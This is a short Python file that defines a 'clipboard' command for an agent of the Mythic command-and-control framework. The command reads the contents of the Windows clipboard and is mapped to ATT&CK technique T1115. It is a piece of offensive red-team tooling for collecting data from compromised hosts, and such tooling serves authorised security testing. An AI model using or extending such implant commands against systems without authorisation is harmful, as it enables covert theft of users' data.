from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

    async def parse_dictionary(self, dictionary_arguments):
        pass


class ClipboardCommand(CommandBase):
    cmd = "clipboard"
    needs_admin = False
    help_cmd = "clipboard"
    description = "Read the current contents of the Windows clipboard."
    version = 1
    author = "@grampae"
    attackmapping = ["T1115"]
    argument_class = ClipboardArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
